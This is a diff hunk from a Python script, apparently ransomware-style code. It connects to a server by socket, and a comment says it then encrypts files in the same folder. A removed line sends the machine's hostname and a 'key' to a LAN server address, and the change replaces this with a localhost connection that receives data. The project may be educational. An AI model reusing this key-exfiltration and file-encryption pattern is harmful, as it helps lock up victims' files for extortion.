@@ -146,17 +146,19 @@ if __name__ == '__main__':
     # client host name
     hostname = os.getenv('COMPUTERNAME')
 
-    # host ip address and port
-    SERVER_IP = '192.168.1.8' 
+    SERVER_IP = 'localhost' 
     SERVER_PORT = 5678
+    FORMAT = 'utf-8'
 
-    # establishing connection
+    # establishing connection with socket
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        
+        # connect
         s.connect((SERVER_IP, SERVER_PORT))
-        s.send(f'{SERVER_IP} : {hostname} : {key} '.encode('utf-8'))
-        # data = s.recv(1024)
-        # while data == "":
-        #     print(data)
+
+        # receive
+        data = s.recv(1024).decode(FORMAT)
+        print(data)
 
 
     # Encrypt file (same folder)
